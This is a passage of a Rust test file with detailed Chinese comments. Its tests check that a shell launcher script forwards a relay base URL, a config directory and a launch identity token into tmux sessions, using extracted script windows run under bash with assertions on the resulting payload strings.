    /// —— 「看起来生效了，只是没走中转」，与 `R08`（账号被静默换掉）同型、同样隐蔽。
    ///
    /// ⚠ **这不是把 ccm 当注入点**（`§0e` 裁三禁的是那个）：注入仍在本文件，
    /// ccm 只是**别把已经注入好的变量吃掉**。「不当收口点」≠「不许碰它」。
    ///
    /// # 本条量两件事，第二件是**真跑**的
    ///
    /// ㈠ **位置**：那段转发落在容器路那个窗口里（载荷拼完之后、`tmux new-session` 之前）；
    ///    非空对照 = 同一个窗口里必须还看得见 `R08` 那条既有的转发。
    /// ㈡ **行为**：把那个窗口**原样抠出来交给 `bash` 跑**（`sq` 用一个桩），
    ///    断言产出的载荷逐字节是什么。⇒ 条件写反、顺序写反、变量名打错，这里都会红。
    ///
    /// # ⚠ 它买不到什么
    ///
    /// **「变量真的穿过了一次真 tmux 边界」没量** —— 那要真 tmux（红线：本轮不起真 daemon、
    /// 也不在门禁里起 tmux），归真机 e2e。本条买的是「那段转发在、条件对、拼出来的串对」。
    ///
    /// # 🔴🔴 **诚实边界（`D4 阻-3`）：本条量的是一条今天生产上到不了的路。**
    ///
    /// 本条**不是假的**（那段 shell 真的会按条件转发，`M12b` 把条件写反就红），
    /// 但**本机中转这条路上没有任何生产输入能走到它**：
    /// 能推出中转 id 的只有 `LaunchAccount::Named`，而 ccm 渲染器对 `Named` **必然** §35 短路
    /// （只有 configDir、没有名字）⇒ **带中转前缀的拉起必然落回没有 tmux 容器的旧路，
    /// 走 ccm 容器路的中转前缀必然是空串。两条路今天不相交。**
    /// 那个事实由 `history::tests::a_launch_that_goes_through_the_relay_still_cannot_get_a_tmux_container`
    /// 逐格钉住（三种账号形状各喂一次）。
    ///
    /// ⇒ **本条是「为将来那条路预备的」**：等 `LaunchAccount::Named` 补上名字、
    /// 具名账号能走进 ccm 的那天，它才开始有生产人群。**别把它的绿读成
    /// 「走中转的会话拿到了 tmux 容器」** —— 那正是 `K-H2b` 这一件在治的那条病
    /// （「代码里有这个形状」≠「这条线接上了」）。
    /// ⚠ 那一天还要**同一拍**给 `shared/ccm` 的 `capabilities=` 串加上对应 token
    /// （现打 17 个 token 里含 `relay`/`base-url`/`anthropic` 的 **0** 个，而 `ccm_probe`
    /// 探的是 PATH 上那个 ccm ⇒ 不加的话装了旧 ccm 的机器会**静默吃掉**这个变量）。
    #[cfg(unix)]
    #[test]
    fn the_ccm_container_path_forwards_the_relay_base_url_across_the_tmux_boundary() {
        const CCM: &str = include_str!("../../../../shared/ccm");
        // 窗口 = 容器路里「载荷拼好 → 起 tmux」之间那一段。
        const START: &str = "\n  payload=\"\"\n";
        const END: &str = "\n  t=\"$(sq \"=$tmux_name:\")\"";
        // ① 两个锚点**全树各恰好一处** —— 先断这个，下面的 `find` 才是「那一处」而不是「第一处」。
        //
        // 🔴〔`K-P5e` `KP5ED3`〕**这三行是补上来的。** 在此之前这里只有一句注释逐字写着
        //    「两个锚点全树各恰好一处」，而本函数体里 `.matches(` / `.count()` **各 0 处**
        //    （`K-P5c` 与 `K-P5d` 两拍各现打一次，读数一致）⇒ **那是一句没有牙的注释**：
        //    真长出第二处锚点时 `find` 会静默地取「第一处」，窗口整个取错、下面全是空真。
        //    补法**逐格照抄**下面那条 `…_forwards_the_launch_identity_…`（`K-P5c` 那条真断言），
        //    **没发明第二种写法**。
        assert_eq!(
            CCM.matches(START).count(),
            1,
            "载荷拼装那个起点锚点在 `shared/ccm` 里不是恰好一处 —— \
             `find` 取的就成了「第一处」，窗口可能整个取错"
        );
        assert_eq!(
            CCM.matches(END).count(),
            1,
            "起 tmux 那个终点锚点在 `shared/ccm` 里不是恰好一处 —— 同上"
        );
        let start = CCM.find(START).expect("找不到载荷拼装的起点锚点");
        let end = CCM.find(END).expect("找不到起 tmux 那个锚点");
        assert!(start < end, "两个锚点的先后反了 —— 窗口取错了");
        let window = &CCM[start..end];
        // 抽取器自检 + 非空对照：`R08` 那条既有转发必须在同一个窗口里。
        assert!(
            window.contains("export CLAUDE_CONFIG_DIR=$(sq \"$CLAUDE_CONFIG_DIR\"); $payload"),
            "窗口里看不见 R08 那条既有转发 —— 窗口取错了，下面整条是空真。实得：{window}"
        );
        // ㈠ 位置：新那条转发在同一个窗口里。
        assert!(
            window.contains("export ANTHROPIC_BASE_URL=$(sq \"$ANTHROPIC_BASE_URL\"); $payload"),
            "容器路里没有把 `ANTHROPIC_BASE_URL` 转发进载荷内侧 ——\n\
             走 tmux 的那些会话会静默地不走中转（外侧那句 export 在 tmux 边界被吃掉），\n\
             而症状是「中转接上了、可它没生效」，指不向这里。实得窗口：{window}"
        );

        // ㈡ 行为：把窗口原样交给 bash 跑一遍。`sq` 用桩（真的那份住 ccm 上面，不在窗口里）。
        let script = format!(
            "sq() {{ printf \"'%s'\" \"$1\"; }}\n\
             inner=(claude --resume S1)\n\
             {window}\n\
             printf '%s' \"$payload\"\n"
        );
        let run = |base: Option<&str>, cfg: Option<&str>| -> String {
            let mut c = std::process::Command::new("bash");
            c.arg("-c").arg(&script);
            c.env_remove("ANTHROPIC_BASE_URL");
            c.env_remove("CLAUDE_CONFIG_DIR");
            if let Some(b) = base {
                c.env("ANTHROPIC_BASE_URL", b);
            }
            if let Some(d) = cfg {
                c.env("CLAUDE_CONFIG_DIR", d);
            }
            let out = c.output().expect("跑那段窗口");
            assert!(
                out.status.success(),
                "那段窗口自己跑不起来：{}",
                String::from_utf8_lossy(&out.stderr)
            );
            String::from_utf8_lossy(&out.stdout).to_string()
        };
        // 非空对照：两个变量都没有 ⇒ 载荷就是裸 argv（证明这把尺子不是恒带前缀）。
        assert_eq!(run(None, None), "'claude' '--resume' 'S1'");
        // 正题：有 base URL ⇒ 它被写进载荷**内侧**。
        assert_eq!(
            run(
                Some("http://127.0.0.1:8788/s/claude-code/acct-a/sid-1"),
                None
            ),
            "export ANTHROPIC_BASE_URL='http://127.0.0.1:8788/s/claude-code/acct-a/sid-1'; \
             'claude' '--resume' 'S1'"
        );
        // 两条转发并存时**互不吃掉对方**（R08 那条是既有行为，本件不许改它）。
        let both = run(
            Some("http://127.0.0.1:8788/s/claude-code/acct-a/sid-1"),
            Some("/home/u/.claude-accts/acct-a"),
        );
        assert!(
            both.contains(
                "export ANTHROPIC_BASE_URL='http://127.0.0.1:8788/s/claude-code/acct-a/sid-1'; "
            ) && both.contains("export CLAUDE_CONFIG_DIR='/home/u/.claude-accts/acct-a'; "),
            "两条转发并存时有一条被吃掉了：{both}"
        );
    }

    /// ★★★ `KP5CD2`：**容器路把起会话方铸的身份 token 转发过 tmux 边界。**
    ///
    /// 形状**逐格照抄**上面那条
    /// [`the_ccm_container_path_forwards_the_relay_base_url_across_the_tmux_boundary`]
    /// —— 同一个窗口、同一个抽取法、同一套四样（① 锚点唯一 · ② 抽取器自检 + 非空对照 ·
    /// ㈠ 位置 · ㈡ 行为）。**一格新方法都没发明。**
    ///
    /// # 它买的是什么
    ///
    /// `K-P5b` 把身份塞进的是**起会话方那一侧**的进程环境（`history.rs` 里
    /// `let identity = launch_identity(action);` + `let cmd = relay + &identity.prefix + &base;`
    /// 那两行）。走 ccm 容器那一支时，
    /// 那句 `export` 落在**外层 shell** 上，而 `send-keys` 打进的是 tmux server fork 出来的
    /// 新 shell —— `update-environment` 的默认列表不含它 ⇒ **整个被吃掉，到不了 agent 进程。**
    /// 这与 `R08`（`CLAUDE_CONFIG_DIR`）· `K-H2b`（`ANTHROPIC_BASE_URL`）**是同一个坑的第三次**。
    /// 本条买的是「那段转发在、条件对、拼出来的串对」。
    ///
    /// 🔴〔`K-P5e` `§8 一`〕**上面那句引用是订正过的，别把它读成一直如此。**
    /// 它先前逐字写着 `relay + launch_identity_prefix(action) + base`，而 `K-P5h`（09-02 晚）
    /// 把那个函数**改名成了 `launch_identity`** ⇒ 主干 `4cf4301` 之后这一句指向一个
    /// **不存在的符号**。人群现打（09-02，尺子 = 全仓 731 个跟踪文件里出现旧符号名的**行**）：
    /// **5 行** —— `history.rs` 里 `launch_local` 拼装那一段的注释、与
    /// [`crate::history`] 那个身份结构的头注，两处都是 `K-P5h` 自己写的**历史引用**
    /// （逐字「上一版是…」「本拍已改名为」）⇒ **它们是对的，别动**；
    /// 另两行在 `evidence/K-P5d-C-ccm-negotiation-probe.py`（`§8 二`，同拍收）；
    /// **本行是唯一那句真陈账。**
    /// ⚠ 订正之后它**不再只是一句散文**：`let identity = launch_identity(action);` 与
    /// `let cmd = relay + &identity.prefix + &base;` 两行现在都被
    /// [`tests::every_variable_exported_outside_ccm_is_forwarded_by_the_container_path`]
    /// 用 `find_pinned` 钉在 `history.rs` 的**生产段**上（各恰好一处）
    /// ⇒ 那边再改名，本行当场有人红。
    /// 🔴 但**别把这一格读成「陈账这一族被治住了」** —— 那张网归 `K-R18`，
    /// 本件只收这一句（`K-P5e §8 三` 逐字裁的）。
    ///
    /// # 🔴 它与上面那条先例**有一格不同**（别把两条读成同一句话）
    ///
    /// 那条先例的头注逐字写着自己「量的是一条今天生产上到不了的路」（能推出中转 id 的只有
    /// `LaunchAccount::Named`，而 ccm 渲染器对 `Named` 必然 §35 短路）。
    /// **本条不是**：身份前缀是**无条件**拼上去的（不看账号形状），而 `LaunchAccount::Base`
    /// 正是 `render_local_ccm_with` 唯一渲得出容器的那一格
    /// ⇒ **「Base 账号 + 有 tmux 名」这条今天就走得到的输入，直接落在本条守的那段 shell 上。**
    /// ⇒ 别把本条读成「又一条为将来预备的」。
    ///
    /// # ⚠ 它买不到什么（如实写）
    ///
    /// - **「变量真的穿过了一次真 tmux 边界」没量** —— 那要真 tmux（红线：门禁里不起 tmux），归 e2e。
    ///   本条把那段窗口原样交给 `bash` 跑，量的是**拼出来的载荷串**。
    /// - **PATH 上装的那个 `ccm` 是旧版时会静默吃掉它**：`capabilities=` 里没有对应 token
    ///   （现打 17 个 token 里含 `launch-id`/`identity` 的 **0** 个），而 `ccm_probe` 探的是
    ///   PATH 上那个 `ccm`，不是本仓这份 ⇒ **调用方无从协商**。本拍照 `K-H2b` 的先例
    ///   没加 token（加了就要同拍补一行用法块，`every_advertised_capability_has_a_usage_line`
    ///   数着），**挂在件文件的上报口里等 PM 裁** —— 而它与那条先例的债不同：
    ///   那一条今天生产不可达，**这一条可达**。
    /// - `sq` 用的是**桩**（`printf "'%s'"`），真的那份住 `ccm` 上面、不在窗口里
    ///   ⇒ 本条**不量引法的正确性**，只量「引了、拼在内侧」。
    #[cfg(unix)]
    #[test]
    fn the_ccm_container_path_forwards_the_launch_identity_across_the_tmux_boundary() {
        const CCM: &str = include_str!("../../../../shared/ccm");
        // 窗口 = 容器路里「载荷拼好 → 起 tmux」之间那一段。
        const START: &str = "\n  payload=\"\"\n";
        const END: &str = "\n  t=\"$(sq \"=$tmux_name:\")\"";
        // ① 两个锚点**全树各恰好一处** —— 先断这个，下面的 `find` 才是「那一处」而不是「第一处」。
        assert_eq!(
            CCM.matches(START).count(),
            1,
            "载荷拼装那个起点锚点在 `shared/ccm` 里不是恰好一处 —— \
             `find` 取的就成了「第一处」，窗口可能整个取错"
        );
        assert_eq!(
            CCM.matches(END).count(),
            1,
            "起 tmux 那个终点锚点在 `shared/ccm` 里不是恰好一处 —— 同上"
        );
        let start = CCM.find(START).expect("找不到载荷拼装的起点锚点");
        let end = CCM.find(END).expect("找不到起 tmux 那个锚点");
        assert!(start < end, "两个锚点的先后反了 —— 窗口取错了");
        let window = &CCM[start..end];
        // ② 抽取器自检 + 非空对照：**既有那两条转发都必须在同一个窗口里**。
        //    少了这一格，窗口取歪了下面整条恒绿 —— 那是先例报文里逐字写着的空真形状。
        for (who, needle) in [
            (
                "R08 · CLAUDE_CONFIG_DIR",
                "export CLAUDE_CONFIG_DIR=$(sq \"$CLAUDE_CONFIG_DIR\"); $payload",
            ),
            (
                "K-H2b · ANTHROPIC_BASE_URL",
                "export ANTHROPIC_BASE_URL=$(sq \"$ANTHROPIC_BASE_URL\"); $payload",
            ),
        ] {
            assert!(
                window.contains(needle),
                "窗口里看不见既有转发 `{who}` —— 窗口取错了，下面整条是空真。实得：{window}"
            );
        }

        // ㈠ 位置：新那条转发在同一个窗口里。
        // 🔴 针**从 `history.rs` 那个常量现拼**，不写死字面量：
        //    改了那边的变量名而没改 `ccm` ⇒ 本条当场红（漂开在结构上被逮住，
        //    而不是靠两处各写一份字面量再指望有人记得同时改）。
        let var = crate::history::LAUNCH_ID_VAR;
        let forward = format!("export {var}=$(sq \"${var}\"); $payload");
        assert!(
            window.contains(&forward),
            "容器路里没有把 `{var}` 转发进载荷内侧 ——\n\
             走 tmux 的那些会话，agent 进程环境里根本没有身份（外侧那句 export 在 tmux \
             边界被吃掉），\n\
             而症状是「起会话方以为交下去了」，指不向这里。要找的那一句：{forward}\n\
             实得窗口：{window}"
        );

        // ㈡ 行为：把窗口原样交给 bash 跑一遍。`sq` 用桩（真的那份住 ccm 上面，不在窗口里）。
        let script = format!(
            "sq() {{ printf \"'%s'\" \"$1\"; }}\n\
             inner=(claude --resume S1)\n\
             {window}\n\
             printf '%s' \"$payload\"\n"
        );
        let run = |id: Option<&str>, base: Option<&str>, cfg: Option<&str>| -> String {
            let mut c = std::process::Command::new("bash");
            c.arg("-c").arg(&script);
            c.env_remove(var);
            c.env_remove("ANTHROPIC_BASE_URL");
            c.env_remove("CLAUDE_CONFIG_DIR");
            if let Some(v) = id {
                c.env(var, v);
            }
            if let Some(b) = base {
                c.env("ANTHROPIC_BASE_URL", b);
            }
            if let Some(d) = cfg {
                c.env("CLAUDE_CONFIG_DIR", d);
            }
            let out = c.output().expect("跑那段窗口");
            assert!(
                out.status.success(),
                "那段窗口自己跑不起来：{}",
                String::from_utf8_lossy(&out.stderr)
            );
            String::from_utf8_lossy(&out.stdout).to_string()
        };
        // 非空对照：三个变量都没有 ⇒ 载荷就是裸 argv（证明这把尺子不是恒带前缀）。
        assert_eq!(run(None, None, None), "'claude' '--resume' 'S1'");
        // 正题：有身份 ⇒ 它被写进载荷**内侧**。
        assert_eq!(
            run(Some("tok-1"), None, None),
            format!("export {var}='tok-1'; 'claude' '--resume' 'S1'")
        );
        // 三条转发并存时**互不吃掉对方**（上面两条是既有行为，本件不许改它们）。
        let all = run(
            Some("tok-1"),
            Some("http://127.0.0.1:8788/s/claude-code/acct-a/sid-1"),
            Some("/home/u/.claude-accts/acct-a"),
        );
        for expect in [
            format!("export {var}='tok-1'; "),
            "export ANTHROPIC_BASE_URL='http://127.0.0.1:8788/s/claude-code/acct-a/sid-1'; "
                .to_string(),
            "export CLAUDE_CONFIG_DIR='/home/u/.claude-accts/acct-a'; ".to_string(),
        ] {
            assert!(
                all.contains(&expect),
                "三条转发并存时有一条被吃掉了（缺 `{expect}`）：{all}"
            );
        }
        assert!(
            all.ends_with("'claude' '--resume' 'S1'"),
            "转发把 argv 顶掉了：{all}"
        );
    }

    // ═════════════════════════════════════════════════════════════════════════
    // 🔴 `K-P5e`：**拼在 `ccm` 外面 `export` 的变量 ⊆ 容器路转发的变量**
    // ═════════════════════════════════════════════════════════════════════════
    //
    // 下面四个函数是**判据本体**（`KP5ED2` 要的那一格）：真判据
    // [`every_variable_exported_outside_ccm_is_forwarded_by_the_container_path`] 与活体夹具
    // [`the_outside_export_gate_really_reddens_on_a_live_breach`] **共用**它们，
    // 夹具跑的不是它们的复刻。
    //
    // 🔴 **09-02 现打的两刀读数**（`K-G4 §7 裁六` 那一刀的形状，逐字记在这里）：
    //   · 掏空 `not_forwarded` ⇒ **真判据留绿、只有活体夹具红** —— 与 `K-G4` 实测同形，
    //     ⇒ **本族的牙长在活体夹具那一格上，它是承重件**，别当它是「一条多余的复刻」。
    //   · 掏空 `exported_var_names` ⇒ **两条都红**（真判据被「左集恰好 2 个」那一格接住）。
    // ⚠ 另外两个（`fn_body` · `forwarded_by_container_path`）**这一拍没逐个下刀**，
    //   它们各自带自检（切不出来 / 数不到就 panic）—— 那是**登记，不是「已经验过」**。

    /// 按花括号配平切一个**函数体**（含两端花括号）。
    ///
    /// 🔴 **切不出来就 panic，不回空串** —— 回空串会让上层的计数变成「零命中地绿」，
    /// 那正是本工作区最贵的那类病。锚点走 [`guard_core::find_pinned`]（要求恰好一处 + 有词边界）。
    ///
    /// ⚠ 它是个**朴素**的配平器：只对「体里的花括号成对」的函数成立
    /// （今天的两个渲染器都是一句 `format!`，`{}`/`{ident}` 都是成对的）。
    /// 拿它去切带不配对花括号字面量的函数会切错 —— 长度自检只挡得住离谱的那种。
    fn fn_body(prod: &str, sig: &str) -> String {
        let at = guard_core::find_pinned(prod, sig)
            .unwrap_or_else(|e| panic!("锚点 `{sig}` 不是恰好一处 —— 形状变了，先修锚点：{e}"));
        let open = at
            + prod[at..]
                .find('{')
                .unwrap_or_else(|| panic!("`{sig}` 之后找不到函数体的左花括号"));
        let mut depth = 0usize;
        for (i, c) in prod[open..].char_indices() {
            match c {
                '{' => depth += 1,
                '}' => {
                    depth -= 1;
                    if depth == 0 {
                        let body = prod[open..open + i + 1].to_string();
                        assert!(
                            (20..4_000).contains(&body.len()),
                            "`{sig}` 的体切出来 {} 字节 —— 不像一个前缀渲染器的体，抽取器可能坏了",
                            body.len()
                        );
                        return body;
                    }
                }
                _ => {}
            }
        }
        panic!("`{sig}` 的体花括号没配平 —— 抽取器坏了，别当它切出来了");
    }

    /// 判据本体·**左半**：从「拼在 `ccm` 外面那几截」里逐截抠出**被 `export` 的变量名**。
    ///
    /// 入参是**生产代码现取的那几截**（渲染器的函数体 / 渲染器真跑出来的串），
    /// **不是手写名单**：那边改了变量名、或同一个渲染器多 `export` 一个，本函数下一趟就跟着变。
    ///
    /// 认法：每一处 `export ` 到下一个 `=` 之间那一段就是变量名。
    /// 🔴 抠出来的东西**不像一个变量名就 panic** —— 比如插值没解析开（`{SOME_CONST}`）。
    /// 不许把它当成一个名字混进人群再去做 ⊆：那会在**恰好该红的那一刻**零命中地绿。
    fn exported_var_names(chunks: &[String]) -> Vec<String> {
        let mut out = Vec::new();
        for c in chunks {
            let mut from = 0usize;
            while let Some(rel) = c[from..].find("export ") {
                let s = from + rel + "export ".len();
                let e = s + c[s..]
                    .find('=')
                    .unwrap_or_else(|| panic!("`export ` 后面找不到 `=`，这一截不是前缀：{c:?}"));
                let name = &c[s..e];
                assert!(
                    !name.is_empty()
                        && name
                            .chars()
                            .all(|ch| ch.is_ascii_uppercase() || ch.is_ascii_digit() || ch == '_'),
                    "从 `export …=` 里抠出来的不像一个变量名：{name:?}（整截：{c:?}）\n\
                     ⇒ 多半是插值没解析开（比如 `{{SOME_CONST}}`）。**不许把它当成一个名字混进人群**\n\
                     —— 那会让下面的 ⊆ 在恰好该红的那一刻绿掉。\n\
                     回来给这个新形状写一条解析法，或者说清它为什么不在人群里。"
                );
                out.push(name.to_string());
                from = e;
            }
        }
        out
    }

    /// 判据本体·**右半**：容器路那个窗口里，**逐条枚举**出来的转发面。
    ///
    /// 枚举法（分母就是它）：窗口里形如
    /// `payload="export <VAR>=$(sq "$<VAR>"); $payload"` 的**行**，逐行抠出 `<VAR>`，
    /// 并把这一行剩下那半**逐字节**核一遍（写成 `$(sq "$别的变量")` 也算跑偏 ⇒ 红）。
    /// **不是手写名单** —— `shared/ccm` 里加一条转发，本函数下一趟就多回一个名字。
    ///
    /// 🔴 窗口取不到 / 一条都数不到就 **panic**，不许回空表冒充「零条」：
    /// 回空表会把下面的 ⊆ 从「今天成立」翻成「今天全违规」—— 方向相反，但同样是假读数。
    fn forwarded_by_container_path(ccm: &str) -> Vec<String> {
        const START: &str = "\n  payload=\"\"\n";
        const END: &str = "\n  t=\"$(sq \"=$tmux_name:\")\"";
        assert_eq!(
            ccm.matches(START).count(),
            1,
            "载荷拼装那个起点锚点不是恰好一处 —— 窗口可能整个取错"
        );
        assert_eq!(
            ccm.matches(END).count(),
            1,
            "起 tmux 那个终点锚点不是恰好一处 —— 同上"
        );
        let (s, e) = (ccm.find(START).unwrap(), ccm.find(END).unwrap());
        assert!(s < e, "两个锚点的先后反了 —— 窗口取错了");
        let mut out = Vec::new();
        for line in ccm[s..e].lines() {
            let Some(rest) = line.trim().strip_prefix("payload=\"export ") else {
                continue;
            };
            let (name, tail) = rest
                .split_once('=')
                .unwrap_or_else(|| panic!("这一行像转发却没有 `=`：{line:?}"));
            assert_eq!(
                tail,
                format!("$(sq \"${name}\"); $payload\""),
                "\n★ 容器路那条转发的形状跑偏了：{line:?}\n\
                 要的是 `payload=\"export <VAR>=$(sq \"$<VAR>\"); $payload\"` —— \
                 转发的必须是**同一个变量**，且拼在载荷**内侧**。"
            );
            out.push(name.to_string());
        }
        assert!(
            !out.is_empty(),
            "容器路窗口里一条转发都数不到 —— 窗口取错了或认法坏了，本条此刻是空转的"
        );
        out
    }

    /// 判据本体·**差集**：左集里没有被容器路转发的那些。空 ⇒ 这道闸今天成立。
    fn not_forwarded(left: &[String], right: &[String]) -> Vec<String> {
        left.iter()
            .filter(|v| !right.contains(v))
            .cloned()
            .collect()
    }

    /// ★★★ `KP5ED1`：**拼在 `ccm` 外面 `export` 的变量 ⊆ 容器路转发的变量。**
    ///
    /// # 🔴 标签是被收窄过的，别读宽（`K-R18` 的口径，`K-P5e §1` 逐字）
    ///
    /// 原来那个标签「起会话方 `export` 的变量」念起来盖**三个人群**而尺子只数得了**一个**，
    /// **而漏的那一次恰是第一次**（`R08` 的 `CLAUDE_CONFIG_DIR` 是**继承**来的、不是 `export` 的）。
    /// ⇒ 本条只买「**拼在 `ccm` 外面 `export` 的**」那一个人群。它**买不到**：
    /// - **继承来的**变量（`R08` 那一形 —— 第一次那个坑本条逮不住）；
    /// - **agent 需要但没人 `export` 的**（`K-P5c` `KP5CD3` PM 已裁**不收**那张表）；
    /// - 🔴 **面一：已经装在这台机器上的那些旧 `ccm` 副本会静默吃掉变量** ——
    ///   那归 `K26`（本机没有 `ccm` 的安装路），**本件一个字节都买不到它**
    ///   （`K-P5d 裁三`：两道闸，一个字节都不互相顶替）。
    ///
    /// # 两个集合各自怎么枚举，分母是什么（`KP5ED1` 逐字要这一节）
    ///
    /// **左集 = 拼在 `ccm` 外面 `export` 的变量**，09-02 现打 **2 个**
    /// （`ANTHROPIC_BASE_URL` · `CCM_LAUNCH_ID`）。枚举法**按函数体切，不按文件切**：
    /// 1. `history.rs` 生产段里那一句 `let cmd = relay + …;`（`find_pinned` ⇒ 恰好一处）
    ///    拆成的段，今天**恰好 3 段**：前两段是前缀、末段 `&base` 是命令体；
    /// 2. 两段前缀各自的**渲染器函数体**（`relay_env_prefix_posix` · `launch_identity_env_prefix`），
    ///    体里 `export ` 各**恰好 1 处**；
    /// 3. 变量名**从生产代码现取**：中转那截从体里读出来再拿**真跑一遍**的产出对拍，
    ///    身份那截把体里 `{LAUNCH_ID_VAR}` 用生产常量 [`crate::history::LAUNCH_ID_VAR`] 解析开。
    ///    ⇒ **一个字面量都没写死**，那边改名本条自动跟着走。
    ///
    /// ⚠ **`K-P5d` 的量具第一版按整份 `payload.rs` 切**，把 `render_env_ops` 混进来数成 4。
    /// 本拍现打复现了那把坏尺子：整份 `payload.rs` 生产段上 `"export (\w+)={}; "` 命中
    /// **3 个名字**（多出 `ANTHROPIC_MODEL` · `CLAUDE_CONFIG_DIR`，两个都住 `render_env_ops`）
    /// + `history.rs` 那 1 个 = **4**，而真值 **2**。
    /// `render_env_ops` 服务的是 `render_payload` 那条路（`launch_wire` / 用量探针），
    /// **根本不经过本条说的那个 tmux 边界** ⇒ 它不在人群里。**这就是为什么按函数体切。**
    ///
    /// **右集 = 容器路转发的变量**，09-02 现打 **3 条**
    /// （`CLAUDE_CONFIG_DIR` · `ANTHROPIC_BASE_URL` · `CCM_LAUNCH_ID`）。
    /// 枚举法见 [`forwarded_by_container_path`]：容器路那个窗口里逐行认，不是手写名单。
    /// ⚠ **3 ≠ 2 不是错**：`CLAUDE_CONFIG_DIR` 那条是转发**继承**来的值（`R08`），
    /// 它在右集里、**不在左集里** —— 那正是 `§1` 说的「标签被收窄过」那一格。
    ///
    /// # 🔴 这道闸今天就是绿的 —— 那是它的形状，不是缺陷
    ///
    /// 2 ⊆ 3 今天成立。**它买的是「第四次在提交那一刻有人红」**：
    /// 谁再往外面那一串上拼一段 `export`，① 段数那一格红 ② 左集那个数红
    /// ③ 忘了在 `shared/ccm` 里加对应转发时 ⊆ 那一格红。
    /// ⚠ 而「今天零违规的判据可能连自己的地基被抽掉都不会响」这件事，由
    /// [`the_outside_export_gate_really_reddens_on_a_live_breach`] 那一格顶着（`KP5ED2`）——
    /// **牙全长在那一格上，它是承重件**（`K-G4 §7 裁六` 的实测结论）。
    ///
    /// # ⚠ 它还买不到什么（如实写）
    ///
    /// - **Windows 那条腿不在人群里**：`ccm` 容器路只有 POSIX 这一支（`C12`「windows不要tmux」），
    ///   `$env:` 那一形本条只数处数、不进集合。
    /// - **`&base` 内部**（`render_local_ccm` / `build_local_posix_command` 渲的那一截）不在人群里：
    ///   它拼在 `ccm` 的**里面**，不过这个边界。
    /// - **`launch.rs` 的 `.env(k, v)`**（开窗那一跳，进程级）不在人群里：它不是一句 `export`。
    /// - **「变量真的穿过了一次真 tmux 边界」没量** —— 那要真 tmux，归真机 e2e。
    /// - 有人在**别的文件**里另起一条拼装路，本条一个字节都不会动
    ///   （它只从那一句 `let cmd = relay + …;` 出发）。⇒ 这是**诚实边界**，不是「今天恰好没有」。
    #[test]
    fn every_variable_exported_outside_ccm_is_forwarded_by_the_container_path() {
        const CCM: &str = include_str!("../../../../shared/ccm");
        let hist = guard_core::production_code(include_str!("../../history.rs"));
        let pay = guard_core::production_code(include_str!("payload.rs"));
        // 抽取器自检：剥完还得看得见东西（否则下面整条是空真）。
        // 门槛现打（09-02，剥完的字节数）：`history.rs` ≈ 48.7k（原文 213k）· `payload.rs` ≈ 8.2k（原文 88k）
        // —— 门槛按现打值往下留一档，不贴着写。
        assert!(
            hist.len() > 30_000 && pay.len() > 5_000,
            "剥完只剩 history={} payload={} 字节 —— 剥法坏了，本条会零命中地绿",
            hist.len(),
            pay.len()
        );

        // ── ① 左集的分母之一：外面那一串**由几段拼起来** ────────────────────────
        let at = guard_core::find_pinned(&hist, "let cmd = relay + ")
            .unwrap_or_else(|e| panic!("本机拉起那一句拼装不是恰好一处 —— 形状变了：{e}"));
        let stmt = &hist[at..][..hist[at..].find(';').expect("拼装那一句没有 `;`")];
        let rhs = stmt.split_once('=').expect("拼装那一句没有 `=`").1;
        let segs: Vec<&str> = rhs.split('+').map(str::trim).collect();
        assert_eq!(
            segs,
            vec!["relay", "&identity.prefix", "&base"],
            "\n★★ 本机拉起拼出来的那一串**段数或段名变了**（实得 {segs:?}）。\n\
             ⇒ 如果新那一段也 `export` 了变量，它必须**同一拍**在 `shared/ccm` 的容器路里\n\
             加一条对应的转发（形状抄 `R08`/`K-H2b`/`K-P5c` 那三条），否则走 tmux 的会话\n\
             会在 tmux 边界把它整个吃掉，而症状指不向这里。\n\
             ⇒ 合法出路只有两条：把新那一段接进本条的左集，或在这里写清它为什么不 `export`。"
        );
        // 那两段前缀各自是谁渲的 —— 整条链**逐环钉住**（改名当场红）。
        for anchor in [
            "let relay = relay_prefix_for_launch(action, account)?;",
            "let identity = launch_identity(action);",
            "relay_env_prefix_posix(&u)",
            "let prefix = launch_identity_env_prefix(&token,",
        ] {
            guard_core::find_pinned(&hist, anchor).unwrap_or_else(|e| {
                panic!("`{anchor}` 不是恰好一处 —— 前缀那条链换了形状，本条的左集就取歪了：{e}")
            });
        }

        // ── ② 左集：**按函数体切**，变量名从生产代码现取 ─────────────────────────
        let body_relay = fn_body(&pay, "pub fn relay_env_prefix_posix(");
        let body_id = fn_body(&hist, "fn launch_identity_env_prefix(");
        assert_eq!(
            body_relay.matches("export ").count(),
            1,
            "中转那个渲染器的**体**里 `export ` 不再是恰好 1 处 —— 同一个渲染器多 export 了一个变量？\
             那一个也要进左集、也要有人转发。实得体：{body_relay}"
        );
        assert_eq!(
            body_id.matches("export ").count(),
            1,
            "身份那个渲染器的**体**里 `export ` 不再是恰好 1 处 —— 同上。实得体：{body_id}"
        );
        assert_eq!(
            body_id.matches("$env:").count(),
            1,
            "身份那个渲染器的 Windows 那一形不再是恰好 1 处 —— 形状变了先回来读头注。实得体：{body_id}"
        );
        // 身份那截：把体里那个**生产常量**的插值解析开。解析不开 ⇒ `exported_var_names` 会 panic。
        let id_chunk = body_id.replace("{LAUNCH_ID_VAR}", crate::history::LAUNCH_ID_VAR);
        assert_ne!(
            id_chunk, body_id,
            "身份渲染器的体里不再用 `LAUNCH_ID_VAR` 那个常量了 —— \
             本条的「变量名从生产现取」就断了，回来重接，别让它悄悄退回写死字面量"
        );
        let left = exported_var_names(&[body_relay, id_chunk]);
        assert_eq!(
            left.len(),
            2,
            "\n★ 左集（拼在 `ccm` 外面 `export` 的变量）从 2 个变成了 {} 个：{left:?}\n\
             09-02 现打的 2 个是 `ANTHROPIC_BASE_URL`（中转那截）· `CCM_LAUNCH_ID`（身份那截）。\n\
             **多了** ⇒ 回来读本条头注那一节，并确认新那个在 `shared/ccm` 的容器路里有对应转发。\n\
             **少了 / 归零** ⇒ 先别改这个数：多半是上面那两个渲染器的体没取到，\
             本条此刻是空转的（09-02 实测：把左半那个原语掏空，就是这个读数）。",
            left.len()
        );
        // 文本 ↔ 行为 对拍：中转那截**真跑一遍**，名字必须与从体里读出来的是同一个。
        assert_eq!(
            exported_var_names(&[relay_env_prefix_posix(
                "http://127.0.0.1:8788/s/claude-code/acct-a/sid-1"
            )]),
            vec![left[0].clone()],
            "中转那个渲染器**跑出来**的变量名与从它体里读出来的不是同一个 —— \
             本条读源码这一半量的不是它真做的事"
        );

        // ── ③ 右集：容器路那个窗口里逐条枚举 ────────────────────────────────────
